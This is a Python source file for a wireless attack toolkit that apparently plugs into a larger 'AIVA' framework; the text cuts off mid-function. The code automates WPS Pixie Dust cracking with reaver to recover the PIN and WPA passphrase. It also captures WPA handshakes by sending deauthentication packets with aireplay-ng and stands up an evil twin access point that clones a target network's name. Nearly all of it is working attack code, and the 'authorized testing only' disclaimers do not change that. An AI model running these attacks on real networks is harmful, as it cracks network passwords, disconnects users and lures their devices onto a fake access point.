#!/usr/bin/env python3
"""
AIVA Wireless Attack Tools - Task 15
無線攻擊工具集 - WiFi滲透、藍牙攻擊、無線網絡安全測試
⚠️ 僅用於授權的安全測試和教育目的 ⚠️
"""

import asyncio
import json
import logging
import os
import re
import subprocess
import time
from dataclasses import dataclass, asdict
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple
import hashlib
import random
import string

from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.table import Table
from rich.text import Text
from rich.tree import Tree

# 本地導入
from ...core.base_capability import BaseCapability
from ...aiva_common.schemas import APIResponse
from ...core.registry import CapabilityRegistry

console = Console()
logger = logging.getLogger(__name__)

# 常量定義
WARNING_MSG = "[yellow]⚠️  僅用於授權測試！[/yellow]"
PROGRESS_DESC = "[progress.description]{task.description}"


@dataclass
class WifiNetwork:
    """WiFi 網絡信息"""
    bssid: str
    essid: str
    channel: int = 0
    encryption: str = "Unknown"
    signal_strength: int = 0
    frequency: str = ""
    vendor: str = ""
    hidden: bool = False
    wps_enabled: bool = False
    clients: Optional[List[str]] = None
    
    def __post_init__(self):
        if self.clients is None:
            self.clients = []


@dataclass
class WifiClient:
    """WiFi 客戶端信息"""
    mac: str
    bssid: str = ""
    signal_strength: int = 0
    last_seen: str = ""
    vendor: str = ""
    probed_essids: Optional[List[str]] = None
    
    def __post_init__(self):
        if self.probed_essids is None:
            self.probed_essids = []


@dataclass
class AttackResult:
    """攻擊結果"""
    attack_type: str
    target: str
    start_time: str
    end_time: str
    duration: float
    success: bool
    captured_data: Dict[str, Any]
    error_details: Optional[str] = None
    
    def __post_init__(self):
        if self.captured_data is None:
            self.captured_data = {}


class WifiScanner:
    """WiFi 掃描器"""
    
    def __init__(self, interface: str = "wlan0"):
        self.interface = interface
        self.monitor_interface = f"{interface}mon"
        self.networks = []
        self.clients = []
        self.is_monitoring = False
    
    async def check_interface(self) -> bool:
        """檢查無線網卡介面"""
        try:
            result = subprocess.run(
                ["iwconfig"], 
                capture_output=True, 
                text=True, 
                timeout=10
            )
            
            if self.interface in result.stdout:
                console.print(f"[green]✅ 找到無線介面: {self.interface}[/green]")
                return True
            else:
                console.print(f"[red]❌ 未找到無線介面: {self.interface}[/red]")
                return False
                
        except Exception as e:
            console.print(f"[red]檢查介面失敗: {e}[/red]")
            return False
    
    async def enable_monitor_mode(self) -> bool:
        """啟用監控模式"""
        try:
            console.print(f"[cyan]正在啟用監控模式: {self.interface}[/cyan]")
            
            # 停止網絡管理器干擾
            subprocess.run(["sudo", "systemctl", "stop", "NetworkManager"], 
                         capture_output=True, timeout=10)
            
            # 關閉介面
            subprocess.run(["sudo", "ifconfig", self.interface, "down"], 
                         capture_output=True, timeout=10)
            
            # 啟用監控模式
            result = subprocess.run(
                ["sudo", "iwconfig", self.interface, "mode", "monitor"],
                capture_output=True, text=True, timeout=10
            )
            
            if result.returncode == 0:
                # 啟動介面
                subprocess.run(["sudo", "ifconfig", self.interface, "up"], 
                             capture_output=True, timeout=10)
                
                self.is_monitoring = True
                console.print(f"[green]✅ 監控模式已啟用[/green]")
                return True
            else:
                console.print(f"[red]啟用監控模式失敗: {result.stderr}[/red]")
                return False
                
        except Exception as e:
            console.print(f"[red]啟用監控模式錯誤: {e}[/red]")
            return False
    
    async def disable_monitor_mode(self) -> bool:
        """停用監控模式"""
        try:
            console.print(f"[cyan]正在停用監控模式: {self.interface}[/cyan]")
            
            # 關閉介面
            subprocess.run(["sudo", "ifconfig", self.interface, "down"], 
                         capture_output=True, timeout=10)
            
            # 切換回管理模式
            subprocess.run(["sudo", "iwconfig", self.interface, "mode", "managed"], 
                         capture_output=True, timeout=10)
            
            # 啟動介面
            subprocess.run(["sudo", "ifconfig", self.interface, "up"], 
                         capture_output=True, timeout=10)
            
            # 重啟網絡管理器
            subprocess.run(["sudo", "systemctl", "start", "NetworkManager"], 
                         capture_output=True, timeout=10)
            
            self.is_monitoring = False
            console.print(f"[green]✅ 監控模式已停用[/green]")
            return True
            
        except Exception as e:
            console.print(f"[red]停用監控模式錯誤: {e}[/red]")
            return False
    
    async def scan_networks(self, duration: int = 30) -> List[WifiNetwork]:
        """掃描 WiFi 網絡"""
        console.print(f"[bold cyan]🔍 開始掃描 WiFi 網絡 ({duration} 秒)[/bold cyan]")
        console.print(WARNING_MSG)
        
        if not self.is_monitoring:
            if not await self.enable_monitor_mode():
                return []
        
        self.networks.clear()
        
        try:
            with Progress(
                SpinnerColumn(),
                TextColumn(PROGRESS_DESC),
                BarColumn(),
                console=console
            ) as progress:
                
                task_id = progress.add_task(
                    f"掃描中... 介面: {self.interface}",
                    total=duration
                )
                
                # 使用 airodump-ng 掃描
                cmd = [
                    "sudo", "timeout", str(duration),
                    "airodump-ng", self.interface,
                    "--write", "/tmp/airodump",
                    "--output-format", "csv"
                ]
                
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                
                # 更新進度
                for i in range(duration):
                    await asyncio.sleep(1)
                    progress.update(task_id, completed=i + 1)
                
                process.terminate()
                process.wait(timeout=5)
                
                # 解析結果
                await self._parse_airodump_results()
        
        except Exception as e:
            console.print(f"[red]掃描失敗: {e}[/red]")
        
        console.print(f"[green]✅ 掃描完成！發現 {len(self.networks)} 個網絡[/green]")
        return self.networks
    
    async def _parse_airodump_results(self):
        """解析 airodump-ng 結果"""
        try:
            csv_file = "/tmp/airodump-01.csv"
            if not os.path.exists(csv_file):
                return
            
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            
            # 清理臨時文件
            for file in Path("/tmp").glob("airodump*"):
                try:
                    file.unlink()
                except:
                    pass
            
            parsing_networks = True
            
            for line in lines:
                line = line.strip()
                if not line:
                    continue
                    
                if "Station MAC" in line:
                    parsing_networks = False
                    continue
                
                if parsing_networks and not line.startswith("BSSID"):
                    parts = [p.strip() for p in line.split(',')]
                    if len(parts) >= 14:
                        try:
                            network = WifiNetwork(
                                bssid=parts[0],
                                essid=parts[13] if parts[13] else "<hidden>",
                                channel=int(parts[3]) if parts[3].isdigit() else 0,
                                encryption=parts[5],
                                signal_strength=int(parts[8]) if parts[8].lstrip('-').isdigit() else 0,
                                frequency=parts[4],
                                hidden=not bool(parts[13])
                            )
                            self.networks.append(network)
                        except (ValueError, IndexError):
                            continue
        
        except Exception as e:
            logger.debug(f"解析 airodump 結果失敗: {e}")
    
    def show_networks(self):
        """顯示掃描到的網絡"""
        if not self.networks:
            console.print("[yellow]沒有發現 WiFi 網絡[/yellow]")
            return
        
        table = Table(title="🌐 發現的 WiFi 網絡")
        table.add_column("序號", style="cyan", width=6)
        table.add_column("BSSID", style="yellow", width=18)
        table.add_column("ESSID", style="green", width=20)
        table.add_column("頻道", style="blue", width=8)
        table.add_column("加密", style="magenta", width=12)
        table.add_column("信號", style="red", width=8)
        
        for i, network in enumerate(self.networks, 1):
            signal = f"{network.signal_strength} dBm" if network.signal_strength else "N/A"
            table.add_row(
                str(i),
                network.bssid,
                network.essid[:18] + "..." if len(network.essid) > 18 else network.essid,
                str(network.channel),
                network.encryption,
                signal
            )
        
        console.print(table)


class WPSAttack:
    """WPS 攻擊"""
    
    def __init__(self, interface: str = "wlan0"):
        self.interface = interface
        self.target_network = None
    
    async def check_wps_enabled(self, bssid: str) -> bool:
        """檢查目標是否啟用 WPS"""
        try:
            cmd = ["sudo", "wash", "-i", self.interface, "-C"]
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            # 運行 10 秒
            await asyncio.sleep(10)
            process.terminate()
            
            stdout, stderr = process.communicate(timeout=5)
            
            if bssid.lower() in stdout.lower():
                console.print(f"[green]✅ 目標 {bssid} 啟用了 WPS[/green]")
                return True
            else:
                console.print(f"[red]❌ 目標 {bssid} 未啟用 WPS[/red]")
                return False
                
        except Exception as e:
            console.print(f"[red]檢查 WPS 失敗: {e}[/red]")
            return False
    
    async def pixie_dust_attack(self, target: WifiNetwork) -> AttackResult:
        """Pixie Dust 攻擊"""
        console.print(f"[bold red]✨ 開始 Pixie Dust 攻擊: {target.essid}[/bold red]")
        console.print(WARNING_MSG)
        
        start_time = datetime.now()
        
        try:
            if not await self.check_wps_enabled(target.bssid):
                return AttackResult(
                    attack_type="Pixie Dust",
                    target=f"{target.essid} ({target.bssid})",
                    start_time=start_time.isoformat(),
                    end_time=datetime.now().isoformat(),
                    duration=0,
                    success=False,
                    captured_data={},
                    error_details="Target does not support WPS"
                )
            
            # 使用 reaver 進行 Pixie Dust 攻擊
            cmd = [
                "sudo", "reaver",
                "-i", self.interface,
                "-b", target.bssid,
                "-c", str(target.channel),
                "-K", "1",  # Pixie Dust 攻擊
                "-vv"
            ]
            
            console.print("[cyan]執行 Pixie Dust 攻擊...[/cyan]")
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            pin = None
            passphrase = None
            
            # 監控輸出
            with Progress(
                SpinnerColumn(),
                TextColumn(PROGRESS_DESC),
                console=console
            ) as progress:
                
                task_id = progress.add_task("Pixie Dust 攻擊中...", total=None)
                
                # 最多等待 300 秒
                for _ in range(300):
                    if process.poll() is not None:
                        break
                    
                    try:
                        output = process.stdout.readline()
                        if output:
                            # 查找 PIN 和密碼
                            if "WPS PIN:" in output:
                                pin = output.split("WPS PIN:")[-1].strip()
                            elif "WPA PSK:" in output:
                                passphrase = output.split("WPA PSK:")[-1].strip()
                            
                            progress.update(task_id, description=f"攻擊中... {output.strip()[:50]}")
                    except:
                        pass
                    
                    await asyncio.sleep(1)
                
                # 終止進程
                if process.poll() is None:
                    process.terminate()
                    process.wait(timeout=5)
            
            end_time = datetime.now()
            duration = (end_time - start_time).total_seconds()
            
            success = bool(pin and passphrase)
            captured_data = {}
            
            if success:
                captured_data = {
                    "wps_pin": pin,
                    "wpa_passphrase": passphrase,
                    "bssid": target.bssid,
                    "essid": target.essid
                }
                console.print(f"[bold green]🎉 Pixie Dust 攻擊成功！[/bold green]")
                console.print(f"[green]WPS PIN: {pin}[/green]")
                console.print(f"[green]WPA 密碼: {passphrase}[/green]")
            else:
                console.print(f"[yellow]Pixie Dust 攻擊未成功[/yellow]")
            
            return AttackResult(
                attack_type="Pixie Dust",
                target=f"{target.essid} ({target.bssid})",
                start_time=start_time.isoformat(),
                end_time=end_time.isoformat(),
                duration=duration,
                success=success,
                captured_data=captured_data
            )
            
        except Exception as e:
            console.print(f"[red]Pixie Dust 攻擊失敗: {e}[/red]")
            return AttackResult(
                attack_type="Pixie Dust",
                target=f"{target.essid} ({target.bssid})",
                start_time=start_time.isoformat(),
                end_time=datetime.now().isoformat(),
                duration=(datetime.now() - start_time).total_seconds(),
                success=False,
                captured_data={},
                error_details=str(e)
            )


class HandshakeCapture:
    """握手包捕獲"""
    
    def __init__(self, interface: str = "wlan0"):
        self.interface = interface
        self.capture_file = "/tmp/handshake"
    
    async def capture_handshake(self, target: WifiNetwork, timeout: int = 300) -> AttackResult:
        """捕獲 WPA/WPA2 握手包"""
        console.print(f"[bold blue]🤝 開始捕獲握手包: {target.essid}[/bold blue]")
        console.print(WARNING_MSG)
        
        start_time = datetime.now()
        
        try:
            # 清理舊文件
            for file in Path("/tmp").glob("handshake*"):
                try:
                    file.unlink()
                except:
                    pass
            
            # 啟動 airodump-ng 捕獲
            dump_cmd = [
                "sudo", "airodump-ng",
                self.interface,
                "--bssid", target.bssid,
                "--channel", str(target.channel),
                "--write", self.capture_file
            ]
            
            dump_process = subprocess.Popen(
                dump_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # 等待一段時間讓捕獲開始
            await asyncio.sleep(5)
            
            # 發送解除認證包
            deauth_cmd = [
                "sudo", "aireplay-ng",
                "--deauth", "10",
                "-a", target.bssid,
                self.interface
            ]
            
            console.print("[cyan]發送解除認證包強制重新連接...[/cyan]")
            
            deauth_process = subprocess.Popen(
                deauth_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # 監控握手包捕獲
            handshake_captured = False
            
            with Progress(
                SpinnerColumn(),
                TextColumn(PROGRESS_DESC),
                BarColumn(),
                console=console
            ) as progress:
                
                task_id = progress.add_task(
                    f"捕獲握手包中... 目標: {target.essid}",
                    total=timeout
                )
                
                for i in range(timeout):
                    # 檢查是否捕獲到握手包
                    if await self._check_handshake_captured():
                        handshake_captured = True
                        break
                    
                    progress.update(task_id, completed=i + 1)
                    await asyncio.sleep(1)
            
            # 停止捕獲
            dump_process.terminate()
            deauth_process.terminate()
            
            try:
                dump_process.wait(timeout=5)
                deauth_process.wait(timeout=5)
            except:
                pass
            
            end_time = datetime.now()
            duration = (end_time - start_time).total_seconds()
            
            captured_data = {}
            if handshake_captured:
                captured_data = {
                    "handshake_file": f"{self.capture_file}-01.cap",
                    "bssid": target.bssid,
                    "essid": target.essid,
                    "channel": target.channel
                }
                console.print(f"[bold green]🎉 握手包捕獲成功！[/bold green]")
            else:
                console.print(f"[yellow]未能捕獲握手包[/yellow]")
            
            return AttackResult(
                attack_type="Handshake Capture",
                target=f"{target.essid} ({target.bssid})",
                start_time=start_time.isoformat(),
                end_time=end_time.isoformat(),
                duration=duration,
                success=handshake_captured,
                captured_data=captured_data
            )
            
        except Exception as e:
            console.print(f"[red]握手包捕獲失敗: {e}[/red]")
            return AttackResult(
                attack_type="Handshake Capture",
                target=f"{target.essid} ({target.bssid})",
                start_time=start_time.isoformat(),
                end_time=datetime.now().isoformat(),
                duration=(datetime.now() - start_time).total_seconds(),
                success=False,
                captured_data={},
                error_details=str(e)
            )
    
    async def _check_handshake_captured(self) -> bool:
        """檢查是否捕獲到握手包"""
        try:
            cap_file = f"{self.capture_file}-01.cap"
            if os.path.exists(cap_file):
                # 使用 aircrack-ng 檢查握手包
                result = subprocess.run(
                    ["aircrack-ng", cap_file],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                
                if "handshake" in result.stdout.lower():
                    return True
            
            return False
            
        except Exception:
            return False


class EvilTwinAP:
    """惡意雙胞胎 AP"""
    
    def __init__(self, interface: str = "wlan0"):
        self.interface = interface
        self.hostapd_conf = "/tmp/hostapd.conf"
        self.dnsmasq_conf = "/tmp/dnsmasq.conf"
        self.ap_process = None
        self.dns_process = None
    
    async def create_evil_twin(self, target: WifiNetwork, duration: int = 300) -> AttackResult:
        """創建惡意雙胞胎 AP"""
        console.print(f"[bold red]👥 創建惡意雙胞胎 AP: {target.essid}[/bold red]")
        console.print(WARNING_MSG)
        
        start_time = datetime.now()
        
        try:
            # 創建 hostapd 配置
            await self._create_hostapd_config(target)
            
            # 創建 dnsmasq 配置
            await self._create_dnsmasq_config()
            
            # 配置網絡介面
            await self._configure_interface()
            
            # 啟動 hostapd
            console.print("[cyan]啟動惡意 AP...[/cyan]")
            self.ap_process = subprocess.Popen(
                ["sudo", "hostapd", self.hostapd_conf],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            await asyncio.sleep(3)
            
            # 啟動 dnsmasq
            console.print("[cyan]啟動 DNS/DHCP 服務...[/cyan]")
            self.dns_process = subprocess.Popen(
                ["sudo", "dnsmasq", "-C", self.dnsmasq_conf],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # 運行指定時間
            console.print(f"[green]✅ 惡意 AP 已啟動，運行 {duration} 秒...[/green]")
            
            connected_clients = []
            
            with Progress(
                SpinnerColumn(),
                TextColumn(PROGRESS_DESC),
                BarColumn(),
                console=console
            ) as progress:
                
                task_id = progress.add_task(
                    f"惡意 AP 運行中... ESSID: {target.essid}",
                    total=duration
                )
                
                for i in range(duration):
                    # 檢查連接的客戶端
                    clients = await self._get_connected_clients()
                    if clients:
                        for client in clients:
                            if client not in connected_clients:
                                connected_clients.append(client)
                                console.print(f"[yellow]📱 新客戶端連接: {client}[/yellow]")
                    
                    progress.update(task_id, completed=i + 1)
                    await asyncio.sleep(1)
            
            # 停止服務
            await self._stop_evil_twin()
            
            end_time = datetime.now()
            duration_actual = (end_time - start_time).total_seconds()
            
            captured_data = {
                "connected_clients": connected_clients,
                "target_essid": target.essid,
                "target_bssid": target.bssid,
                "evil_twin_duration": duration_actual
            }
            
            success = len(connected_clients) > 0
            
            if success:
                console.print(f"[bold green]🎉 惡意 AP 攻擊成功！捕獲 {len(connected_clients)} 個客戶端[/bold green]")
            else:
                console.print(f"[yellow]惡意 AP 攻擊完成，但沒有客戶端連接[/yellow]")
            
            return AttackResult(
                attack_type="Evil Twin AP",
                target=f"{target.essid} ({target.bssid})",
                start_time=start_time.isoformat(),
                end_time=end_time.isoformat(),
                duration=duration_actual,
                success=success,
                captured_data=captured_data
            )
            
        except Exception as e:
            console.print(f"[red]惡意 AP 攻擊失敗: {e}[/red]")
            await self._stop_evil_twin()
            return AttackResult(
                attack_type="Evil Twin AP",
                target=f"{target.essid} ({target.bssid})",
                start_time=start_time.isoformat(),
                end_time=datetime.now().isoformat(),
                duration=(datetime.now() - start_time).total_seconds(),
                success=False,
                captured_data={},
                error_details=str(e)
            )
    
    async def _create_hostapd_config(self, target: WifiNetwork):
        """創建 hostapd 配置文件"""
        config = f"""interface={self.interface}
driver=nl80211
ssid={target.essid}
hw_mode=g
channel={target.channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=12345678
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
"""
        
        with open(self.hostapd_conf, 'w') as f:
            f.write(config)
    
    async def _create_dnsmasq_config(self):
        """創建 dnsmasq 配置文件"""
        config = f"""interface={self.interface}
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
"""
        
        with open(self.dnsmasq_conf, 'w') as f:
            f.write(config)
    
    async def _configure_interface(self):
        """配置網絡介面"""
        subprocess.run(["sudo", "ifconfig", self.interface, "up"], capture_output=True)
        subprocess.run(["sudo", "ifconfig", self.interface, "192.168.1.1"], capture_output=True)
    
    async def _get_connected_clients(self) -> List[str]:
        """獲取連接的客戶端"""
        try:
            result = subprocess.run(
                ["sudo", "iw", "dev", self.interface, "station", "dump"],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            clients = []
            for line in result.stdout.split('\n'):
                if "Station" in line:
                    mac = line.split()[1]
                    clients.append(mac)
            
            return clients
            
        except Exception:
            return []
    
    async def _stop_evil_twin(self):
        """停止惡意 AP"""
        if self.ap_process:
            self.ap_process.terminate()
            try:
                self.ap_process.wait(timeout=5)
            except:
                self.ap_process.kill()
        
        if self.dns_process:
            self.dns_process.terminate()
            try:
                self.dns_process.wait(timeout=5)
            except:
                self.dns_process.kill()
        
        # 清理配置文件
        for conf_file in [self.hostapd_conf, self.dnsmasq_conf]:
            try:
                os.unlink(conf_file)
            except:
                pass


class BluetoothScanner:
    """藍牙掃描器"""
    
    def __init__(self):
        self.devices = []
    
    async def scan_bluetooth_devices(self, duration: int = 30) -> List[Dict[str, Any]]:
        """掃描藍牙設備"""
        console.print(f"[bold blue]🔵 開始掃描藍牙設備 ({duration} 秒)[/bold blue]")
        console.print(WARNING_MSG)
        
        self.devices.clear()
        
        try:
            # 啟動藍牙
            subprocess.run(["sudo", "systemctl", "start", "bluetooth"], capture_output=True)
            subprocess.run(["sudo", "hciconfig", "hci0", "up"], capture_output=True)
            
            with Progress(
                SpinnerColumn(),
                TextColumn(PROGRESS_DESC),
                BarColumn(),
                console=console
            ) as progress:
                
                task_id = progress.add_task(
                    "掃描藍牙設備中...",
                    total=duration
                )
                
                # 使用 hcitool 掃描
                cmd = ["sudo", "timeout", str(duration), "hcitool", "scan"]
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                
                # 更新進度
                for i in range(duration):
                    await asyncio.sleep(1)
                    progress.update(task_id, completed=i + 1)
                
                process.wait()
                stdout, stderr = process.communicate()
                
                # 解析結果
                await self._parse_bluetooth_results(stdout)
        
        except Exception as e:
            console.print(f"[red]藍牙掃描失敗: {e}[/red]")
        
        console.print(f"[green]✅ 掃描完成！發現 {len(self.devices)} 個藍牙設備[/green]")
        return self.devices
    
    async def _parse_bluetooth_results(self, output: str):
        """解析藍牙掃描結果"""
        lines = output.strip().split('\n')
        
        for line in lines:
            if '\t' in line and len(line.split('\t')) >= 2:
                parts = line.split('\t')
                mac = parts[0].strip()
                name = parts[1].strip() if len(parts) > 1 else "Unknown"
                
                if mac and ':' in mac:
                    device = {
                        "mac": mac,
                        "name": name,
                        "device_class": "Unknown",
                        "services": []
                    }
                    self.devices.append(device)
    
    def show_bluetooth_devices(self):
        """顯示藍牙設備"""
        if not self.devices:
            console.print("[yellow]沒有發現藍牙設備[/yellow]")
            return
        
        table = Table(title="🔵 發現的藍牙設備")
        table.add_column("序號", style="cyan", width=6)
        table.add_column("MAC 地址", style="yellow", width=18)
        table.add_column("設備名稱", style="green", width=20)
        table.add_column("設備類型", style="blue", width=15)
        
        for i, device in enumerate(self.devices, 1):
            table.add_row(
                str(i),
                device["mac"],
                device["name"],
                device["device_class"]
            )
        
        console.print(table)


class WirelessManager:
    """無線攻擊管理器"""
    
    def __init__(self, interface: str = "wlan0"):
        self.interface = interface
        self.scanner = WifiScanner(interface)
        self.wps_attack = WPSAttack(interface)
        self.handshake_capture = HandshakeCapture(interface)
        self.evil_twin = EvilTwinAP(interface)
        self.bluetooth_scanner = BluetoothScanner()
        self.attack_results = []
    
    async def check_dependencies(self) -> bool:
        """檢查依賴工具"""
        tools = [
            "aircrack-ng", "airodump-ng", "aireplay-ng",
            "reaver", "wash", "hostapd", "dnsmasq",
            "hcitool", "iwconfig", "ifconfig"
        ]
        
        missing_tools = []
        
        for tool in tools:
            try:
                result = subprocess.run(
                    ["which", tool],
                    capture_output=True,
                    timeout=5
                )
                if result.returncode != 0:
                    missing_tools.append(tool)
            except:
                missing_tools.append(tool)
        
        if missing_tools:
            console.print(f"[red]❌ 缺少工具: {', '.join(missing_tools)}[/red]")
            console.print("[yellow]請安裝以下套件:[/yellow]")
            console.print("sudo apt-get install aircrack-ng reaver hostapd dnsmasq bluez-tools")
            return False
        else:
            console.print("[green]✅ 所有依賴工具已安裝[/green]")
            return True
    
    async def interactive_menu(self):
        """互動式選單"""
        while True:
            console.print("\n" + "="*60)
            console.print(Panel.fit(
                "[bold cyan]🔒 AIVA 無線攻擊工具集[/bold cyan]\n"
                "⚠️  僅用於授權的安全測試！",
                border_style="cyan"
            ))
            
            table = Table(title="可用功能", show_lines=True)
            table.add_column("選項", style="cyan", width=6)
            table.add_column("功能", style="yellow", width=20)
            table.add_column("描述", style="white")
            
            table.add_row("1", "掃描 WiFi 網絡", "掃描附近的無線網絡")
            table.add_row("2", "WPS Pixie Dust 攻擊", "利用 WPS 漏洞獲取密碼")
            table.add_row("3", "握手包捕獲", "捕獲 WPA/WPA2 握手包")
            table.add_row("4", "惡意雙胞胎 AP", "創建偽造的接入點")
            table.add_row("5", "藍牙設備掃描", "掃描附近藍牙設備")
            table.add_row("6", "顯示攻擊結果", "查看歷史攻擊結果")
            table.add_row("0", "退出", "退出程序")
            
            console.print(table)
            
            try:
                choice = Prompt.ask("[bold cyan]請選擇功能[/bold cyan]", default="0")
                
                if choice == "1":
                    await self._wifi_scan_menu()
                elif choice == "2":
                    await self._wps_attack_menu()
                elif choice == "3":
                    await self._handshake_menu()
                elif choice == "4":
                    await self._evil_twin_menu()
                elif choice == "5":
                    await self._bluetooth_scan_menu()
                elif choice == "6":
                    self._show_attack_results()
                elif choice == "0":
                    break
                else:
                    console.print("[red]無效選擇，請重試[/red]")
                    
            except KeyboardInterrupt:
                console.print("\n[yellow]用戶中斷操作[/yellow]")
                break
            except Exception as e:
                console.print(f"[red]錯誤: {e}[/red]")
    
    async def _wifi_scan_menu(self):
        """WiFi 掃描選單"""
        if not await self.scanner.check_interface():
            return
        
        duration = IntPrompt.ask("掃描時間 (秒)", default=30)
        networks = await self.scanner.scan_networks(duration)
        
        if networks:
            self.scanner.show_networks()
    
    async def _wps_attack_menu(self):
        """WPS 攻擊選單"""
        if not self.scanner.networks:
            console.print("[yellow]請先掃描 WiFi 網絡[/yellow]")
            return
        
        self.scanner.show_networks()
        
        try:
            choice = IntPrompt.ask("選擇目標網絡序號", default=1)
            if 1 <= choice <= len(self.scanner.networks):
                target = self.scanner.networks[choice - 1]
                
                if Confirm.ask(f"確認攻擊 {target.essid}？"):
                    result = await self.wps_attack.pixie_dust_attack(target)
                    self.attack_results.append(result)
            else:
                console.print("[red]無效選擇[/red]")
        except Exception as e:
            console.print(f"[red]攻擊失敗: {e}[/red]")
    
    async def _handshake_menu(self):
        """握手包捕獲選單"""
        if not self.scanner.networks:
            console.print("[yellow]請先掃描 WiFi 網絡[/yellow]")
            return
        
        self.scanner.show_networks()
        
        try:
            choice = IntPrompt.ask("選擇目標網絡序號", default=1)
            if 1 <= choice <= len(self.scanner.networks):
                target = self.scanner.networks[choice - 1]
                
                if Confirm.ask(f"確認捕獲 {target.essid} 的握手包？"):
                    timeout = IntPrompt.ask("超時時間 (秒)", default=300)
                    result = await self.handshake_capture.capture_handshake(target, timeout)
                    self.attack_results.append(result)
            else:
                console.print("[red]無效選擇[/red]")
        except Exception as e:
            console.print(f"[red]捕獲失敗: {e}[/red]")
    
    async def _evil_twin_menu(self):
        """惡意 AP 選單"""
        if not self.scanner.networks:
            console.print("[yellow]請先掃描 WiFi 網絡[/yellow]")
            return
        
        self.scanner.show_networks()
        
        try:
            choice = IntPrompt.ask("選擇目標網絡序號", default=1)
            if 1 <= choice <= len(self.scanner.networks):
                target = self.scanner.networks[choice - 1]
                
                if Confirm.ask(f"確認創建 {target.essid} 的惡意雙胞胎？"):
                    duration = IntPrompt.ask("運行時間 (秒)", default=300)
                    result = await self.evil_twin.create_evil_twin(target, duration)
                    self.attack_results.append(result)
            else:
                console.print("[red]無效選擇[/red]")
        except Exception as e:
            console.print(f"[red]惡意 AP 創建失敗: {e}[/red]")
    
    async def _bluetooth_scan_menu(self):
        """藍牙掃描選單"""
        duration = IntPrompt.ask("掃描時間 (秒)", default=30)
        devices = await self.bluetooth_scanner.scan_bluetooth_devices(duration)
        
        if devices:
            self.bluetooth_scanner.show_bluetooth_devices()
    
    def _show_attack_results(self):
        """顯示攻擊結果"""
        if not self.attack_results:
            console.print("[yellow]沒有攻擊結果[/yellow]")
            return
        
        table = Table(title="🎯 攻擊結果")
        table.add_column("攻擊類型", style="cyan")
        table.add_column("目標", style="yellow")
        table.add_column("結果", style="green")
        table.add_column("持續時間", style="blue")
        
        for result in self.attack_results:
            status = "✅ 成功" if result.success else "❌ 失敗"
            table.add_row(
                result.attack_type,
                result.target,
                status,
                f"{result.duration:.1f}s"
            )
        
        console.print(table)
    
    def generate_report(self) -> str:
        """生成攻擊報告"""
        if not self.attack_results:
            return "沒有攻擊結果可以生成報告"
        
        report = f"""# 🔒 無線攻擊測試報告
生成時間: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

## 📊 攻擊摘要
- 攻擊次數: {len(self.attack_results)}
- 成功攻擊: {sum(1 for r in self.attack_results if r.success)}
- 失敗攻擊: {sum(1 for r in self.attack_results if not r.success)}

## 🎯 攻擊詳情
"""
        
        for i, result in enumerate(self.attack_results, 1):
            report += f"""
### 攻擊 #{i}: {result.attack_type}
- **目標**: {result.target}
- **時間**: {result.start_time} - {result.end_time}
- **持續時間**: {result.duration:.2f} 秒
- **結果**: {'成功' if result.success else '失敗'}
"""
            
            if result.captured_data:
                report += "- **捕獲數據**:\n"
                for key, value in result.captured_data.items():
                    report += f"  - {key}: {value}\n"
            
            if result.error_details:
                report += f"- **錯誤詳情**: {result.error_details}\n"
        
        report += """
## ⚠️  免責聲明
此報告僅用於授權的安全測試目的。
"""
        
        return report


class WirelessCapability(BaseCapability):
    """無線攻擊能力"""
    
    def __init__(self):
        super().__init__()
        self.name = "wireless_attack_tools"
        self.version = "1.0.0"
        self.description = "無線攻擊工具集 - WiFi/藍牙滲透測試"
        self.dependencies = ["aircrack-ng", "reaver", "hostapd", "dnsmasq"]
        self.manager = None
    
    async def initialize(self) -> bool:
        """初始化能力"""
        try:
            console.print("[yellow]初始化無線攻擊工具集...[/yellow]")
            console.print("[red]⚠️  請確保僅用於授權測試！[/red]")
            
            # 檢查是否為 root 用戶
            if os.geteuid() != 0:
                console.print("[yellow]警告: 某些功能需要 root 權限[/yellow]")
            
            # 初始化管理器
            interface = "wlan0"  # 可配置
            self.manager = WirelessManager(interface)
            
            # 檢查依賴
            deps_ok = await self.manager.check_dependencies()
            if not deps_ok:
                console.print("[yellow]部分工具缺失，某些功能可能無法使用[/yellow]")
            
            return True
            
        except Exception as e:
            logger.error(f"初始化失敗: {e}")
            return False
    
    async def execute(self, command: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """執行命令"""
        try:
            if not self.manager:
                return {"success": False, "error": "Manager not initialized"}
            
            if command == "interactive_menu":
                await self.manager.interactive_menu()
                return {"success": True, "message": "Interactive menu completed"}
            
            elif command == "scan_wifi":
                duration = parameters.get('duration', 30)
                networks = await self.manager.scanner.scan_networks(duration)
                return {
                    "success": True,
                    "data": {
                        "networks": [asdict(network) for network in networks]
                    }
                }
            
            elif command == "wps_attack":
                target_index = parameters.get('target_index', 0)
                if target_index < len(self.manager.scanner.networks):
                    target = self.manager.scanner.networks[target_index]
